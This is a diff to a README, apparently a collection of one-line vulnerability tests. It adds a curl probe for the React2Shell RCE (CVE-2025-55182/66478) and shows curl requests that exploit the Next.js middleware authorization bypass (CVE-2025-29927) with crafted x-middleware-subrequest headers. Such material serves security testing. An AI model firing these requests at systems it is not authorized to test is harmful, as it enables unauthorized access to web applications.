@@ -1,8 +1,21 @@
 # vuln-liners
 One line vulnerability tests!
 
+## CVE-2025-55182/CVE-2025-66478 (React2Shell RCE)
+`curl -s -w "\n%{http_code}" -X POST "https://<IP>/" \
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0" \
+  -H "Next-Action: x" \
+  -H "X-Nextjs-Request-Id: zAiFWcwUECAo-ZSIOf4mU" \
+  -H "Next-Router-State-Tree: %7B%7D" \
+  -H "X-Nextjs-Html-Request-Id: 1764881245363-58fca15846c3" \
+  -F "1={}" \
+  -F '0=["$1:aa:aa"]' \
+  -k | tee /tmp/response.txt | tail -1 | grep -q "500" && \
+  grep 'E{"digest"' /tmp/response.txt > /dev/null && echo "[VULNERABLE]" || echo "[NOT VULNERABLE]"`
+
 ## CVE-2025-29927 (Next.js Authorization Bypass):
 `curl -Liksv http://localhost:3000/private --header 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'`
+
 `curl -Liksv http://localhost:3000/private --header 'X-Middleware-Subrequest: x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'`
 
 ## CVE-2021-33044, CVE-2021-33045 (Dahua IP Camera Authentication Bypass):
